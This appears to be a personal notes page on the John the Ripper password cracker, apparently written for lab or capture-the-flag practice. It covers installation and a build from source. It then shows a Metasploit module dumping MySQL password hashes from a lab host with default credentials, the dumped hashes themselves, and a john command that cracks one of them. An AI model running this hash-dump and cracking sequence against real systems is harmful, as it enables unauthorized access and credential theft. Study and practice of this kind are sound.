Hash Cracker, has a lot of different distribution. Most popular distribution is "Jumbo John".

## Install

Per Repository:

```
sudo apt install john
```

Building from Source:

https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL

1.   Use `git clone https://github.com/openwall/john -b bleeding-jumbo john` to clone the jumbo john repository to your current working
2.   Then `cd john/src/` to change your current directory to where the source code is. 
3.  Once you're in this directory, use `./configure` to check the required dependencies and options that have been configured.
4.  If you're happy with this output, and have installed any required dependencies that are needed, use `make -s clean && make -sj4` to build a binary of john. This binary will be in the above run directory, which you can change to with `cd ../run`
5.  You can test this binary using ./john --test

## Usage


## Example

Exploit MySQL with [MetaSploit](metasploit)

```
use auxiliary/scanner/mysql/mysql_hashdump 
options
set RHOSTS 10.10.60.123
set USERNAME root
set PASSWORD password
exploit
```

Output:

```
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.60.123:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.60.123:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

And Bruteforce:

```
echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
john hash.txt
```